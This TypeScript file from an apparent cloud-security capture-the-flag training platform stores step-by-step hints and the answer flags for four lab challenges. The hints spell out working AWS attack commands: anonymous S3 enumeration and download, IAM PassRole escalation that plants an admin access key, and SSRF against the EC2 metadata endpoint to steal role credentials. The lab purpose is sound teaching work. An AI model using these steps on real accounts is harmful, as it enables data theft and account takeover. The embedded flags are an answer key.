/** Indices progressifs par challenge (placeholder tant que l'API n'est pas branchée). */

const specific: Record<string, string[]> = {
  "1.1.1": [
    "Les buckets S3 publics peuvent être interrogés sans authentification grâce à l'option --no-sign-request.",
    "Commencez par lister le contenu : aws s3 ls s3://<bucket> --no-sign-request.",
    "Un fichier flag.txt est présent. Récupérez-le : aws s3 cp s3://<bucket>/flag.txt - --no-sign-request.",
  ],
  "1.2.1": [
    "Le bucket pce-marketing-public est public (--no-sign-request), mais un `aws s3 ls` nu ne montre que la vitrine — le fichier sensible est rangé sous un préfixe non listé.",
    "Énumérez TOUT le bucket : aws s3 ls s3://pce-marketing-public --recursive. Cherchez un préfixe internal/ oublié.",
    "Exfiltrez l'objet caché : aws s3 cp s3://pce-marketing-public/internal/hr/employees-export.csv - --no-sign-request. Le flag est en commentaire.",
  ],
  "1.3.1": [
    "Identifiez-vous (aws sts get-caller-identity) puis auditez vos droits : aws iam get-user-policy --user-name ci-deployer --policy-name ci-deploy-inline. Repérez iam:PassRole + ec2:RunInstances + iam:CreateAccessKey.",
    "Exploitez PassRole : lancez une EC2 avec le rôle admin via aws ec2 run-instances --image-id ami-pce --iam-instance-profile Name=admin-profile. Vous récupérez les privilèges admin.",
    "Avec ces droits, posez une access key persistante : aws iam create-access-key --user-name admin-svc. Le SecretAccessKey renvoyé est le flag.",
  ],
  "1.4.1": [
    "L'app écoute sur http://localhost:8080. L'endpoint /fetch?url=... récupère l'URL côté serveur (SSRF) — testez-le avec une URL quelconque.",
    "Pointez la SSRF vers l'IMDSv1 EC2 : /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ pour lister les rôles.",
    "Volez les credentials du rôle pce-app-role : /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/pce-app-role. Le SecretAccessKey est le flag.",
  ],
};

const generic = [
  "Lisez attentivement l'énoncé puis explorez l'environnement avec les commandes de base (ls, whoami, help).",
  "Identifiez précisément le service et la mauvaise configuration ciblés par ce challenge.",
  "Une fois la vulnérabilité exploitée, le flag apparaît. Soumettez-le au format PCE{...}.",
];

export function getHints(challengeId: string): string[] {
  return specific[challengeId] ?? generic;
}

/**
 * Flags réels des challenges adossés à un vrai lab Docker (cohérent avec le
 * seed backend `db/seed.js` et les `challenge.json` de chaque lab).
 */
const realFlags: Record<string, string> = {
  "1.1.1": "PCE{s3_public_bucket_recon_2024}",
  "1.2.1": "PCE{s3_exfil_hidden_prefix_2024}",
  "1.3.1": "PCE{passrole_createaccesskey_escalation_2024}",
  "1.4.1": "PCE{imds_ssrf_stolen_role_creds_2024}",
};

/** Flag attendu en mode démo (cohérent avec le seed backend). */
export function expectedFlag(challengeId: string): string {
  return realFlags[challengeId] ?? `PCE{${challengeId.replace(/\./g, "_")}_flag}`;
}
